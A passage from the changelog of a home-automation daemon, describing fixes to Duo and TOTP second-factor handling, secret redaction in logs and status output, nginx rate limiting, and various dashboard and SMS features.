getting those details wrong one at a time — the version of the canonical form,
then the digest. Keeping four ways of signing in step with somebody else's API
by hand is work with no end to it, and there is no reason to do it on a
machine that has the real thing sitting in site-packages.

Without the package the daemon still signs for itself and says so in the log,
because this ships as one file with no dependencies and must keep working that
way. The four ways stay for that, and are still checked against the package's
own signing. The installer says which of the two a machine will use.

3.58.6 — the log said it plainly at last:

    duo -> GET api-d8384172.duosecurity.com/auth/v2/check sig v2, 0 parameter(s)
    duo <- /auth/v2/check HTTP 401 in 218 ms: Invalid signature (code 40103)
    duo -> GET api-d8384172.duosecurity.com/auth/v2/check sig v5, 0 parameter(s)
    duo <- /auth/v2/check HTTP 401 in 165 ms: Invalid signature (code 40103)

Both refused, on the simplest request there is — a GET with no parameters at
all — which rules out the parameters, the body and the headers, and leaves the
digest. **The Auth API documents HMAC-SHA1**; the published client defaults to
SHA-512, and I had followed the client both times.

There are four ways in use, between the shapes of the canonical string and the
two digests. All four are written out, all four checked against the published
client's own signing, and each is tried in turn until one answers — the one
that does is written down and asked for from then on, with a line in the log
saying which. Four requests, once, against one refusal that never says which
of the four it wants.

3.58.5 — two things that make Duo answer *Invalid signature* while the keys
are right.

**A key pasted from a web page brings a space or a newline with it**, and a
key with one stuck to it signs a request Duo refuses in exactly the words it
refuses a wrong key with. What is pasted in is stored without the whitespace
around it now, and stripped again when it is used, for the ones already saved.

**And that refusal says nothing about its own cause**, so it now carries what
it can be: the two keys the other way round, a stray space, or a hostname from
a different application than the keys. Three things that look identical to Duo
from here.

3.58.4 — **3.58.0 to 3.58.3 wrote the word `true` over every secret saved
from the settings page.** Read this one.

3.58.0 stopped the daemon saying what a secret is — it says only whether one
is set — which was right, and I did not follow it through to the page. The
page wrote what the daemon said into the box, so a password box came up
holding the word `true`, and pressing Save wrote that word over the secret.
The MQTT password, the sockets' password, the gateway's password, the Telegram
token, the word a forwarded message must carry, and the Duo key: any of them
saved from that page in those four versions is now four letters. It is why Duo
answered *Invalid signature in request credentials* however often the keys were
retyped — the next save undid them.

An upgrade puts back what it can, once, and says what it did. Where
`config.json` holds the setting, the override is dropped and the file's value
stands again, with a line in the log. Where it does not, the secret is gone
and has to be typed in once more; that is written in the log and in **Events**
by name, rather than left to be discovered by a gateway refusing to log in.

A secret is never written into its own box now. It comes up empty, says
*(kept)* beside it, and an empty box means *keep the one it has* — which is
how the SMS card has always done it. `test/render.js` refuses a release where
any secret box comes up with something in it.

And the talk with Duo is in the debug log now, since the last release said it
was not and that turned out to be the thing standing between a wrong signature
and knowing why: which request went, signed which way, how many parameters,
and what came back. The Authorization header, the keys and any code are still
not written down — a bad signature is mended by knowing the shape of what was
signed, not the secret it was signed with.

3.58.3 — with debug logging on, nothing of the talk with Duo is written down:
not a header, not the keys, not the body, not a code. Only the sentence Duo
itself sends back when something is wrong, which is what makes it mendable.
That was worth checking rather than assuming, and checking it turned up
something next to it.

**A link opened by its address went into this daemon's own debug log, whole.**
The header road exists because a URL is written down everywhere it goes — and
one of those places was here. So was the word a forwarded message must carry,
in the address the modem calls. Both are blotted now, with the last four
letters left so two links can still be told apart:

    api "GET /api/tap/…z_tU HTTP/1.1" 200 -

The header road never wrote anything down: `POST /api/tap` is the whole line,
and the secret and the code travel in headers, which no line of this log
touches.

3.58.2 — Duo answered *Invalid signature in request credentials*, and it was
right to.

Two ways of writing the canonical string a request is signed over are in use.
Version 2 is the date, the method, the host, the path and the parameters, and
is what the Auth API documents. Version 5 adds the hash of a JSON body and the
hash of the X-Duo headers, and is what the published client now defaults to —
which is where I read it from, and I took the default for the documented
truth. An account takes one of them and calls the other a bad signature,
saying nothing about which.

So it is found out rather than assumed. Both are written out and checked
against the published client, the documented one is tried first, the other
once if that is what comes back, and whichever answers is written down — so it
is asked at most once, and the log says which it was. Neither is guessed at
again after that.

3.58.1 — and Duo could not be chosen. Its boxes were not asked for until Duo
was the factor, and Duo could not be made the factor until its boxes were
filled in, so there was nowhere to type them: the setting refused itself.

Choosing a factor and demanding one are two decisions, and only the second can
lock anybody out. The choice always stands now, and it is always on the page —
it is what makes that factor's own boxes appear, so it cannot wait for
anything. What gives way is the demand: asking for a factor nothing in the
house can answer is switched off, with a line saying which and why —
*Duo has no hostname, keys or username yet, so asking for a second factor is
off for now*. Fill them in, switch it back on. The same for a code with no
phone to carry it, which used to be refused outright.

3.58.0 — the second factor is now **a choice between two**, and the switch
that turned it on says so: *ask for a second factor*, and then *which*.

**A code from a phone** is what it was: six digits from an authenticator,
which a watch cannot produce, so a press made on the wrist has to be finished
on the phone.

**Duo** asks the person instead. The press does not act: it asks Duo, Duo asks
you, and the thing happens when you approve it. Duo has a watch app of its
own, so a press made on the wrist is approved on the wrist — which is the one
thing none of the other answers could manage. The shortcut carries one header
and no code at all; it comes back for the answer with `X-Zigmon-Wait` and a
ticket, and waits there rather than asking again and again. The approving, the
waiting and the acting all happen on a thread of the daemon's own, so what was
pressed happens whether or not the watch is still listening when the answer
comes.

The Auth API signs every request with HMAC-SHA512 over a canonical form of it.
That is written out in the daemon rather than carried as a dependency — the
published client is five thousand lines, four thousand of which are an API
this has no use for, and this is one file with none. **It is checked against
that client's own signing**: three hundred and fifty requests, POST and GET,
byte for byte the same.

Nothing is thrown away by choosing. The phones keep their secrets, Duo keeps
its keys, every link keeps its address, and the four ways a link may be opened
are untouched by any of it. Turn the factor round and back and everything is
where it was; the settings for the one not chosen are simply not asked for
while nothing uses them.

**And a secret in the settings was in the status in plain text.** The status is
answered before the view lock — it has to be, or a locked dashboard could not
say it was locked — so the gateway's password, the Telegram token and the word
the modem must send were readable by anyone who could reach the page at all,
and a Duo key was about to join them. A secret now goes out as *whether it is
set*, which is all the page ever needed: it draws a box that says *(kept)* and
sends a new one only when one is typed. The one place that really wanted the
value — the forwarding address for the modem — asks for it behind the PIN,
where showing a secret is written down.

**The last five releases said 3.55.5 inside.** A bump is made with sed, and
sed says nothing when it matches nothing: each one looked for the version
before it, the file had moved on by another route, and every bump from 3.56.0
to 3.57.0 quietly did nothing. All three places agreed the whole time, which
is all the test asked of them. It asks two more things now — that the version
is the same as the newest entry in this changelog, and that the entries run
downhill — and both would have caught it on the first release.

3.57.0 — the SMS card asks **what kind of SIM** the modem carries: prepaid,
which has credit that runs out, or a contract, which has none. A contract SIM
answers `*101#` with nothing, or with something that is not money, and a
figure that means nothing is worse than no figure.

Choosing *a contract* puts the whole of it away rather than leaving it
switched off by hand: the code, the pattern and the beat are not asked for at
all, the beat is set to never, the button that asks the network is gone, and
the figures that were true of the SIM before are **taken off the modem's
card** — one standing there looking current is the worst of the three. Switch
back and the next answer from the network fills them again.

Two new facts say which it is, for a message that wants to mention it:
`{sim_plan}` — *prepaid* or *a contract* — and `{sim_prepaid}`, yes or no. The
four credit facts come back empty on a contract rather than with what the last
SIM had.

Also: the boxes under **Phones that carry the code** were drawn as bare
browser inputs. Their row is not one of the link rows, and the rule that gives
the card's boxes their border and their background named those rows by hand.

3.56.3 — and those switches made the dropdown beside them enormous. *Look for
incoming messages* stood as tall as three switches wrapped into a narrow
column, because the settings there are laid on a subgrid so every card's boxes
line up, and a grid row is as high as the tallest thing in it — and a grid item
fills its row unless it is told not to. Two things were wrong and both are
mended: the boxes are told to keep their own height, and the three switches
are given the width of the card rather than one column of it, so they stand on
one line and the row never grows in the first place.

3.56.2 — the same switches under **SMS gateway**, for *a text from a number
nobody knows*. It was three words to choose between — write it down, tell me
by push, tell me by text as well — which is three of the eight ways three
roads can be chosen. A text without a push could not be asked for, nor ntfy
without Telegram. The setting holds the roads themselves now, and the message
is written down either way; the switches say who else hears about it, and none
of them on is *written down and no more*.

The one trap in this was the word `sms`. It used to mean *and by text as
well*, on top of the pushes; it is now the name of a road and means that one
alone. Those are the same three letters, so a house that had asked for a text
would have quietly lost its pushes. Every value that can be standing there was
written by the old dashboard, so it is read the old way **once**, at startup,
written back as roads, and never read that way again — with a line in the log
saying so. `event` and `notify` are not road names and need no such care.

3.56.1 — *Ask that often*, for what is left on the SIM, jumped from **never**
to **every six hours**. Four shorter beats sit between them now — hourly, and
every two, three or four hours — which is the range a prepaid SIM that is
being watched actually wants.

That list is written out twice, once in the daemon which decides what may be
saved and once in the SMS card which is what a person picks from, and the two
can drift: a choice added to one and not the other either cannot be picked or
cannot be saved. `test/inputs.py` now holds them against each other, value for
value and in order.

3.56.0 — **a switch per road** for each kind of message, instead of a list of
the combinations somebody thought of. Three roads make eight ways of choosing;
the list offered seven. *ntfy and a text but not Telegram* could not be said
at all, nor *Telegram and a text but not ntfy* — and a text from a number
nobody knows is exactly the sort of thing somebody wants sent one particular
way.

Each kind now has *its own roads* and three switches behind it. Left alone it
follows the house, and the switches still show where that is — dimmed, because
"follows the house" is not an answer to "so where does it go". Turned on, the
three say all eight ways, and the eighth — none of them on — is the old *say
nothing*, which needs no entry of its own because it is what no switch on
means. The row says which it is: *follows the house: ntfy + Telegram*, or *⛔
nothing — written down only*.

Nothing is saved differently: a kind keeps `{roads: "ntfy,sms"}` or
`{off: true}` as before, and the daemon already took any subset of the three.
`test/render.js` picks the combination the list never had and insists it can
be chosen.

3.55.5 — *the watch would say* went missing under a one-tap link now and
again. Two reasons, and neither of them was the preview failing to arrive.

**A report with nothing to say said nothing at all.** A prepared report that
happens to be empty just now — nothing to report — left the line blank and
remembered that it had, so that link kept an empty preview until its text or
its report was changed. A blank line and a preview that never came look
exactly alike. It says *nothing to report just now*.

**And the answer was written into a box that had been thrown away.** A redraw
between the asking and the answering replaces the row, and the answer went
into the old one; the line stayed empty until something else made the card
redraw. The box is looked up again when the answer lands, not held from when
the question was asked. If the daemon does not answer at all, the round is no
longer remembered either, so the next redraw asks again rather than leaving
the line blank for good.

`test/render.js` makes a report say nothing and insists the line says so.

3.55.4 — and the same again for the length of a value. An `otpauth://` URI is
a hundred and thirty characters; the chip holding it broke across four lines
and became a block, which beside a short chip reads as a different kind of
thing. Every chip is one line now, whatever it holds, cut with an ellipsis if
it has to be — and nothing is lost by the cutting: the whole value is still
what is copied, still what the QR code holds, and now also what the tooltip
says. Three places build these chips; all three build them the same way, and
one rule in the stylesheet decides how they look.

3.55.3 — the two buttons beside a phone under **Phones that carry the code**
stood on top of *last used 17 h 56 min ago*. The row was borrowed from Rooms,
which keeps thirty-six pixels at the end for one button; there are two here,
and they overflowed left across the words. The phones have a row of their own
now: the name, then whatever is left over, then exactly as much as the buttons
need, hard against the right edge — and the words are given the room between,
cut with an ellipsis rather than written over.

3.55.2 — the link's own secret was dressed differently from every other value
in the same dialogue: larger, with a line down its edge, from when it was
asked to stand out. Beside `X-Zigmon-Tap`, which is an ordinary chip, it read
as a different kind of thing, and it is not one. Every value that can be
carried away now looks the same wherever it appears — one chip, click to copy,
hover for a code — and the rule that made the difference is gone rather than
merely unused.

3.55.1 — a live update no longer takes away **a dropdown that is open or a
run of text being copied**. It rebuilt the card, and whatever was inside it
went: the list shut, the selection was lost, and the person did the same thing
again and lost it again.

Editors were already guarded one card at a time, by whether something in them
had the keyboard. Neither of these belongs to a card — a selection can run
across several — so they are held at the one place every live repaint passes
through. Nothing is thrown away by holding: the newest state is kept as it
arrives, the long poll keeps running, and the moment the list shuts or the
selection is let go the page is drawn from the newest thing the daemon said.
What is delayed is the drawing, never the data. While it is waiting the corner
says so — *Held — a list is open*, *Held — text selected* — because a page
that has stopped drawing for a reason nobody can see is indistinguishable from
one that has stopped working.

There is no way to ask a browser whether a native dropdown is open, so it is
followed from the events that open and shut one, with twenty seconds as a way
out in case the one that shuts it never arrives.

Also: the **SMS log opens on *Everything*** rather than on the inbox alone —
what was sent and what arrived read as one conversation, which is how a
conversation is read.

`test/render.js` holds a dropdown open and a sentence selected, puts a live
update through, and insists both are still there afterwards and that the page
lets go once they are done with. And its check on the one-tap preview no
longer fails on a house that has no indoor temperature: what the preview must
show is a sentence with the `{…}` filled in, not a digit.

3.55.0 — two faults that had been there all along, found by throwing rubbish
at the daemon rather than by reading it: eleven hundred nonsense API calls and
three and a half thousand malformed broker payloads, including three thousand
random mutations of a real reading. Nothing crashed — but two of those
payloads did real damage, quietly.

**One reading of `NaN` and every dashboard stopped updating.** Python's JSON
reader takes `NaN`, `Infinity` and `1e400` without a word of complaint, and a
firmware saying NaN for a reading it has not got is an ordinary thing. It came
in as a number, was kept as a number, and went out in the status as a bare
`NaN` — which is not valid JSON. The browser's `JSON.parse` throws on it, so
nothing after it is read: the page stops taking updates altogether. And it
does not pass: the value is in the live state and in the database, so a reload
does not help either.

Nothing that is not a finite number gets in now — as a number or spelled as a
word, which some firmware does — and it is dropped as though the device had
not sent that key, leaving the last good reading standing. Behind that, the
API will not serialise one either: it is caught on the way out and taken out
of the answer, for readings written before the door was shut.

**A second reading inside the same second never reached the page.** The
description of a device is worked out once per report and kept, and a report
was known by its timestamp — which is whole seconds. Two readings in one
second looked like one. Worse, the second of them did not arrive when the
second turned over either, because the timestamp it was compared against had
not changed: it waited for the cache to grow half a minute old. A button
pressed twice, a socket answering right after it was switched, a sensor going
on and then off again. Every report now carries a number of its own, one up
from the last, and the description follows it. The status still costs half a
millisecond.

Both are guarded in `test/replay.py`, and both guards were checked against the
old code to be sure they bite.

3.54.8 — a third reading, further in than the other two went: a database with
**three and a half million readings** in it, everything running at once for
twenty seconds, and the memory watched over fifty thousand messages. One thing
came out of it.

**Neither rule queue had a ceiling.** A reading is handed to two workers — one
for plain rules, one for those that first ask the Wi-Fi controller who is in.
A controller that accepts the connection and then says nothing holds that
second worker for a whole timeout at a time, and the readings behind it piled
up, one tuple each, with nothing to stop them. The deferred writes have had a
ceiling of twenty thousand for years; these have it now. The oldest goes,
because it is about a moment that has passed, and it is said once in the log
rather than at every reading.

What the rest of the reading found, which is nothing:

| | |
|---|---|
| 3.37 M samples, 350 MB database | history 6h **0.2 ms**, 24h 0.6 ms, 7d 2.8 ms |
| the same, events | 4,000 events: read 0.2 ms, searched 1.3 ms |
| 20 s of everything at once | 17,371 messages, 9,058 status builds, 64,432 wakeups, 394 presses |
| status under that load | median **0.59 ms**, p95 1.48 ms |
| threads afterwards | back to where they started; the write queue empty |
| errors | **none** |
| 52,000 messages | memory settles at **+3.7 MB** and stops |
| the page, 65 devices | a live update costs 5–11 ms, 7,353 nodes, no error on any tab |

The first roll-up of a long backlog is the one slow thing left: twenty-five
seconds to fold a hundred and twenty days into hourly buckets, with the
database held for it. It happens once — afterwards each run has an hour to do
and takes no measurable time — and it only arises where the daemon has been
away for months. It is written down here rather than mended because mending it
means chunking a transaction that is correct as it stands.

3.54.7 — a reading of the whole thing again, this time with the page actually
running: php and jsdom here, the daemon on a scratch database. Every tab and
every section of Control walked, fifty-eight cards drawn, **no JavaScript
error anywhere** — which had never been checked before, for want of php. Three
faults came out of it, and one of them was in the very thing 3.54.0 was for.

**A shortcut nobody changed over shut the links.** Switch to *by a header
only* while a watch face still holds an old address, and each press of it was
counted as somebody guessing: a second of waiting, and after ten of them every
link refused `429 too many tries` for a minute — the new shortcut with them.

    try  1: 404 after 1002 ms
    try 10: 429 after 2 ms
    the new shortcut, from the same person: 429 too many tries

It is not a guess. The secret was right; the road it came by is shut. The
answer it gets is still word for word the one an address that does not exist
gets, so an old log tells its reader nothing — but it is not counted and it is
not made to wait. Twenty presses now, and the new shortcut works straight
after.

**Every press waited a third of a second for nothing.** A socket answers in
its own time, so its state is read a moment after switching it. A link on a
notification, on heating, on a Zigbee switch or on a sequence has no socket
and nothing to read back; the wait was taken anyway, at every press, on the
wrist. The state is asked for first now, and the wait taken only when there is
something to ask again. **353 ms → 1 ms** for those; a socket still gets its
moment.

**And the second a wrong secret cost is gone from the daemon.** It stopped
nobody — ten wrong tries a minute from one address was already all it would
take — and it held a php-fpm worker and a thread of the daemon for that
second, which is a way to stop the dashboard rather than a way to stop a
guesser. Refusing a flood is the web server's work, and it does it now
(`limit_req`, a minute's worth at one a second, twenty allowed at once). A
side effect worth having: every refusal takes the same time as every other, so
the clock cannot be asked which of them was a real link.

Also: the guess counter kept an entry per address for ever, which on a
dashboard reachable from the internet is one per guesser; addresses whose
tries have aged out are forgotten. And `test/nginx.py` refuses a release where
a `limit_req` names a zone nothing declares, or where the declaration has
wandered inside a server block — it is an http directive and would stop nginx
at start.

3.54.6 — the header's **name** is typed into Shortcuts as surely as its value
is, and it was plain writing on the page: nothing to click, nothing to hover.
`X-Zigmon-Tap` and `X-Zigmon-Code` are chips like everything else now, in the
instructions and in the numbered steps alike — click to copy, hover for a code
to scan. Six of them in one dialogue, and not one of them had been anything
but ink.

3.54.5 — three things the code wanted and did not have.

**A new secret for a phone.** A secret seen by the wrong person is replaced
now, from the phone's own window, the way a link's address already could be:
the same phone, the same name, the same links, and every code the old secret
would show refused from that moment. Taking the phone away instead would have
been a second decision — about which links it may open — that nobody asked to
make. It is written down as `the code secret for "…" was replaced`.

**The steps are numbered in the order the shortcut runs.** They said *new
shortcut → Get Contents of URL*, then *before it, add the authenticator's
code*, which is a step nobody follows without going back to undo the last one.
The code action is step two, where it belongs, and the header step now says to
pick the **Code** variable from above the keyboard rather than typing digits
that will have changed by the time they are typed. Each authenticator's own
name for the action is given, since none of them agree: *Get Token*, *Get
Code*, *Get OTP*.

**And a step with nothing more to say printed the word `undefined`** under
itself, in both of these dialogues, for as long as they have existed.

3.54.4 — the QR codes are back on hover and off the page. Drawing them into
the instructions put two black squares in the middle of a page of words, which
is a lot of room for something wanted for the few seconds it takes to carry a
value to a phone. They are on the values themselves again, the way every other
copyable value on this page has always had them — and the one that matters,
the link's own secret at `X-Zigmon-Tap`, is marked as the thing being handed
over: larger, with a line down its edge. The phone's own code secret the same.

3.54.3 — the code was built and looked as though it had not been. Both halves
of it are exactly where nobody looking at their links would look: the switch
in **Settings**, the phones at the **foot of the One-tap links card**, under
the list and under the save buttons. Somebody reading that card sees neither.

So the card says at the top of its list how the links are opened and whether a
code is wanted with it, with a button that goes straight to the setting:

    Opened by a header only · and a code from one phone      [ Change this ]
    Opened by their address · the secret travels in the address

I drove the real page to find this out rather than reading the code — php and
jsdom here, the daemon on a scratch database — and the whole road with it: a
POST with no code is refused 403 and says so, with a wrong one 403 and says
which, with the right one it acts, twice inside the same code it acts again,
with a wrong secret it is the flat 404 an unknown link gets, and an old
address in header-only mode is that same 404. That is the first time this has
been checked as the phone would see it rather than piece by piece.

3.54.2 — and that friendlier refusal **stopped nginx from starting**:

    nginx: [emerg] "default_type" directive is not allowed here

An `if` block takes almost nothing — `return`, `rewrite`, `set` and a short
list besides — and `default_type` is not on it. It sits in the location now,
where it belongs, and the answer is the same. Worse than the mistake was where
it landed: a fault in this file stops the web server, which takes every other
site on that machine with it, and the release before had been read by a test
that says it would start.

`test/nginx.py` reads what is inside every `if` block and refuses a release
that puts anything nginx will not take there. And the installer stopped
patching that block line by line: it writes it whole, whatever shape it is in
now, so a machine carrying either of the two broken forms is mended by an
upgrade rather than needing the file edited by hand.

3.54.1 — opening `https://…/tap` in a browser answered **403 Forbidden** from
nginx, with nothing to say why. It is the first thing anybody does to see
whether the address is there, and the shape is right — a GET is exactly what
that address exists to refuse — but a bare refusal reads as a broken setup.
Anything that is not a POST is answered now:

    {"ok":false,"error":"this address takes a POST carrying an X-Zigmon-Tap header"}

The address is the same for every link and carries no secret, so saying what
it wants gives nothing away. An upgrade mends a configuration that already has
the old form. `test/taps.py` refuses a release where that address refuses a
browser without telling it why.

And the two things meant to be carried to a phone — the address and the
`X-Zigmon-Tap` secret — now have **a QR code each, side by side in the
instructions**, rather than one that appears when the mouse hovers. Hovering
is not something a phone does, and these are read on a phone as often as at a
desk. The authenticator's own secret has one the same way.

3.54.0 — a one-tap link can be opened **by a header instead of by its
address**, and can be made to want a **six-digit code from a phone** as well.
Both are switched in Settings → One-tap links, and nothing is thrown away by
either: the links and their secrets stay exactly as they are, and switching
back brings the old addresses straight back.

**Why the address was the weak part.** The secret is 192 bits, so nobody
guesses it; what happens to it is that it is written down. The web server's
log keeps it, any proxy on the way keeps it, the browser's history keeps it,
a shortcut carrying it is shared and backed up — and the robot that fetches a
link preview when an address is pasted into a message *follows it*, which
means pasting the address into a chat physically presses the link. A header on
a POST is in none of those places.

**Three positions, not two.** *By its address*, *either way*, *by a header
only*. The middle one is how one moves across without the house going dark:
old shortcuts keep working while the new ones are written. Each link now says
which road it was opened by last time, in amber while it is still on the old
one and there is a switch waiting — so the last step is ticking off a list
rather than a jump in the dark. An old address used after the last switch is
refused with word-for-word the answer an address that does not exist gets, and
the owner is told in **Events** instead.

**The code.** Ordinary TOTP — six digits, thirty seconds, SHA-1 — so 2FAS, OTP
Auth or Raivo will carry it, each of which has a Shortcuts action handing back
the current code. Fifteen lines of the standard library rather than a
dependency, checked against the four test vectors in RFC 6238. The secret
belongs to a **phone**, not to a link: ten links would otherwise mean ten
entries in the authenticator and ten things to redo when a phone is lost.

A code is taken for as long as its own thirty seconds are open and refused for
ever after. Single use is the rule for a login, where a replayed code buys a
session; here it buys one press of one thing, in the minute you pressed it
yourself — while a secret read out of a log next week buys nothing at all,
which is the case that matters. And somebody standing in a doorway presses
twice.

**The instructions follow the switch.** The setup dialog writes the recipe for
whichever road is open — the address, or the address plus `X-Zigmon-Tap` plus
`X-Zigmon-Code`, with the Shortcuts steps in the right order. Every value in
it has a QR code on hover, the header secret and the `otpauth://` for the
authenticator included, so nothing has to be typed into a phone. `zigmon
--taps` and `--secret` say the same.

**Two things this found on the way.** Asking for a code with no phone set up
would have shut the links to everybody, from a page that cannot be reached
from outside to undo it; that is refused, and neither setting is left
half-changed. And the guess counter behind the links counted by the caller's
address, which behind the web relay is **always 127.0.0.1** — so it was one
bucket for the whole world and one person guessing could shut the links for
the house. It counts by the browser's own address now.

`test/taps.py` walks all three positions, both roads, the code this window and
one either side and nothing older, the second press inside one code, that a
shut road cannot be told from an unknown link, that no secret leaves with the
status, and that the switch which would lock everybody out is refused.

3.53.0 — a turn of phrase after a **named device's** reading —
`{PIR-Chodba.model.nl}` — could not be written. The daemon has always filled
it correctly; everything a person uses to write one was against them.

**The completer.** A dot after a device name offered that device's readings,
and a dot after a fact offered the turns. A dot after a device's *reading* —
which is exactly where `.nl` belongs — offered nothing at all, so the list
went empty at the one place it was needed and there was nothing to suggest a
turn was even allowed there. And what was picked was put back over everything
after the **first** dot, so choosing a turn there turned `{Name.model.nl}`
into `{Name.nl}`. Each offer now says how far into the placeholder its own
text belongs: a reading replaces what follows the name, a turn only what
follows the last dot. Turns after turns work too (`{Name.model.lower.upper}`),
and a key with a dot of its own — `switch.apower` — is still offered whole.

**The Facts list.** Its last group shows the turns the way the README writes
them, `…nl`, and the button put down what it showed: clicking one wrote
`{…nl}` into the message, ellipsis and all. A turn picked there now goes
*inside* the braces, after the fact it changes — whether the caret sits in an
unfinished `{` or just past a finished one.

**The preview under the text box.** Every other preview asks the daemon what
the message would say. This one filled the `{…}` in itself, against the
examples the Facts list shows, and that copy knew neither the turns nor a
named device's reading: `{home.nl}` and `{PIR-Chodba.model.nl}` stood on the
page exactly as typed, which is what made the whole thing look broken. It
asks the daemon now, like the rest. The character count comes back with the
answer, so what a text will cost is worked out where the rule about
diacritics actually lives.

`test/completer.js` lifts the completer out of the page and runs it against a
made-up dashboard — eleven things typed, what is offered for each and where
what is chosen lands. It needs neither php nor a running daemon:

    node test/completer.js

`test/facts.py` now puts a device in front of every one of the forty-three
turns and insists each comes back filled, with no placeholder left standing.

3.52.4 — under **Rooms**, a thing that is in no room now says so. The card
listed every device with a room to pick beside it and nothing to tell the two
apart, so finding what was still unassigned meant reading all sixty-odd of
them and checking each one said *not in a room*.

They carry a line down the edge and a tint, in the same amber the page uses
elsewhere for a question left open rather than a fault — nothing here has to
be in a room, and the marks are a fraction of that amber's strength so they
are found by an eye that goes looking and ignored by one that does not. The
heading counts them, since a mark is no use where the list is not scrolled to:

    WHAT IS IN THEM · 12 IN NO ROOM

3.52.3 — a reading of the whole thing for bugs and for delay. The timings,
taken on sixty-five sensors: a message off the broker is handled in **0.03
ms**, the status every refresh asks for is built in **half a millisecond**,
and the device list is not read from the database at all. Nothing on the path
a person waits on needed changing. Four smaller faults did.

The dialog that shows a diagnosis added an **Escape listener to the page and
kept it** unless you closed the dialog with Escape. Closed with *OK*, or by
clicking outside, it stayed behind, and the next dialog added another. They
pile up silently and every keystroke afterwards runs all of them.

`message_facts` said **`uptime` and `plugs_on` twice each**. Python keeps the
last, so the first of each pair was dead text — and one of them worked the
figure out a different way, from a different attribute, so editing it changed
nothing at all. Both figures were already settled further down; nothing a
message says has changed.

The dedup stamps behind *the same story inside 15 min stays untold* were
**never forgotten**. A stamp holds nothing back after those fifteen minutes,
and the keys carry what the alert said, so over months they were all different
ones and the table only ever grew. It is swept now, the way the message log
already was.

And two scars from earlier work: a variable in the box's queue that nothing
read, an `if True:` around a block in the scene runner, and five `import
urllib.request` in functions that do not use it.

`test/listeners.py` refuses a release where a listener put on the whole page
from inside a function is never taken off again — an unnamed one, which cannot
be taken off at all, it refuses outright. `test/tables.py` now reads **every**
dictionary written out in the file, not the three named tables alone, and
refuses one that says a key twice.

3.52.2 — the column names over **Zigbee gateways** stood to the right of the
boxes they name, further with every column: *Address* by a little, *Target*
by a hundred and fifty pixels.

Every row on that page is a grid of its own, and the last column was left to
take whatever the *Detect* and *Remove* buttons need. The header's last cell
is empty and needs nothing — so in the header alone that width went to the
five columns above the boxes, and each name walked right by its share of it.
A row carrying the `config.json` label drifted from its neighbours in the
same way, for the same reason.

The width is now measured once, from the widest set of buttons on the page,
and the header and every row are told that one number. Measured rather than
stated: what the words on a button take is as wide as the font and the
language make them, and a stated width is exactly what hung those buttons out
past the card edge before 2.58.2.

The **one-tap links** had the same fault in their last column, quieter at two
icons wide, and are mended with it.

`test/columns.py` reads the page's own stylesheet and refuses a release where
a table sizes a column by its content, or where a header has fewer cells than
its rows have columns.

3.52.1 — the answer to a text message was being **cut at a hundred and
sixty characters** on the way in, silently. It said *saved*, and the tail
was gone — which is exactly what you saw, three characters short of
`{lights_on_list}`.

A hundred and sixty is one message's worth, and the cap made sense when an
answer had to be one message. It does not now: patience grows with the
length, and an answer written with `{….nl}` on several lines is naturally
longer. An answer has the same room an alert has, five hundred characters.

And what it will cost is shown beside the box as it is written:

    163 characters · 2 messages
    20 characters · 1 message (a diacritic halves what fits — {….ascii} sends it plainly)

`test/roundtrip.py` saves your own hundred-and-sixty-three-character answer
and insists every character of it comes back.

3.52.0 — **nothing could be saved in nine editors**, for the same reason and
from the same moment: pressing *Add* leaves an untouched row on the page,
and an untouched row refused the whole list. So from the first press,
nothing saved at all until that row was either finished or taken away.

    SMS commands    REFUSED: command 2 needs a word to listen for
    scenes          REFUSED: scene 2 needs a sensible name
    sequences       REFUSED: sequence 1 needs a sensible name
    schedules       REFUSED: schedule 1: unknown plug or switch

I mended this in the one-tap links a few versions ago and did not think to
look at the rest; every one of them had it. A row with nothing in it at all
is an unfinished thought and is passed over now. A **half-filled** row —
named but pointing nowhere — is still refused, because that is a mistake
rather than a blank, and it still says which row.

`test/roundtrip.py` adds a blank row to what each editor already holds,
saves, and insists nothing was lost — then offers a half-filled one and
insists it is refused. Eight editors checked.

3.51.1 — both of those were the same thing. A one-tap link row is laid out
as a grid, and the plain line was being put **beside** the list rather than
in place of it — so the row gained a cell, every column after it shifted,
and the name box next to it changed width. The line itself then landed in
a column narrow enough to hide it.

The list and the line share one cell now. Whichever is showing, the row has
the same seven cells as it has headings, and the columns do not move:

    A light   cells=7 | list shown  | line hidden
    A scene   cells=7 | list hidden | line “runs the scene's own steps”

`test/render.js` refuses a release where a link showing the line has a cell
more than the headings, or where the line sits outside the cell the list
was in.

3.51.0 — one-tap links get **by hand**, the switch the button bindings have.
With it on, pressing the link takes the target over: rules and schedules
leave it alone until the same link switches it off again. A press from a
wrist is as deliberate as a press on a wall, and it should not be undone by
a schedule ten minutes later.

    hold=True   ->  {'Light-Loznice-Main': 'the link “Lampa”'}
    hold=False  ->  nothing held

Getting this right took two steps, not one: handing the hold to the target
is only half of it, and a socket is settled separately once it has
answered - for a toggle, whether the press takes it over or gives it back
is only known after the socket says where it landed. The bindings have
always done both; the links now do too.

`test/replay.py` presses a link with the switch on and one with it off, and
refuses a release where either gets it wrong.

3.50.1 — a list with one thing in it is still a list, and nobody should be
handed a menu where there is nothing to choose. Where a target is a scene,
a sequence or a message, the Do column is now a **plain line** — *runs the
scene's own steps* — with no control at all, which is what the button
bindings have always done.

That behaviour lived inside the bindings card, so only it and the rules had
it. It is a shared piece now and every editor that offers actions calls it:
the schedules, the SMS commands, the action groups, the presence triggers,
the one-tap links, the what-if, and a scene's own steps and reset step.
Nine places in all.

`test/render.js` refuses a release where any action list is still shown
beside a scene. None is.

3.50.0 — a scene has its own steps, and the daemon runs them without taking
any notice of what is asked of it. So offering **on**, **off**, **toggle**
and the rest beside one is offering a choice that does not exist. Two
editors said so in a note beside the list; the other eight quietly showed
the full set and let you pick something that could not matter.

Where a target is a scene the action is now the single line **runs the
scene's own steps**, and a sequence says the same of itself. It is decided
in the one place every editor asks, so the schedules, the SMS commands, the
action groups, the presence triggers, the one-tap links, the what-if and
the scene steps themselves all got it at once:

    an SMS command: 1 action(s) -> runs the scene's own steps

A socket keeps its full set, which is the other half of getting this right.
`test/render.js` insists on both.

3.49.2 — renaming a section that had anything in it left the rows behind
under the old name and put an empty section beside them. **Every editor
with sections did this**, not only the one you found it in.

It is the same fault as the one-tap links a few versions back, in the code
they all share. A row holds the object it was built with; a redraw replaces
those objects with fresh copies read from the state. The rename wrote the
new name through each row's own copy — into objects that had already been
thrown away — while the new name went into the list of sections. Hence one
empty section and one full one, both real.

Renaming, emptying a section, and dragging a row into one all work against
the list as it stands now, found by id. Checked on a section with two links
in it: the section is renamed and both rows come with it.

